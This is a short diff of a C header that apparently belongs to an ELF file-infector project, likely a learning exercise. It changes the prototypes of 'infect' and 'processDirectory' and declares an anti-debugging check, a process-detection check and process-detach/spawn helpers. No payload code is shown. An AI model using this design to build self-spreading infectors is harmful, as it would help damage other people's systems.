@@ -58,17 +58,23 @@ typedef struct s_elf
 	t_stat stat;
 } t_elf;
 
+struct timezone
+{
+	int tz_minuteswest; /* minutes west of Greenwich */
+	int tz_dsttime;		/* type of DST correction */
+};
+
 /********************************* PROTOTYPES *********************************/
 
 /*
 void clean(t_file file);
 */
-static void infect(char *path, void *begin_ptr);
-static void processDirectory(char *folder, void *begin_ptr);
+static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA);
+static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
+							 size_t OMEGA);
 
 static int is_program_running(const char *target);
 static int is_debugged(void);
-static void signature(char str[]);
 
 static int proc_detach(void); // ft_setsid
 static int proc_spawn(void);  // ft_fork
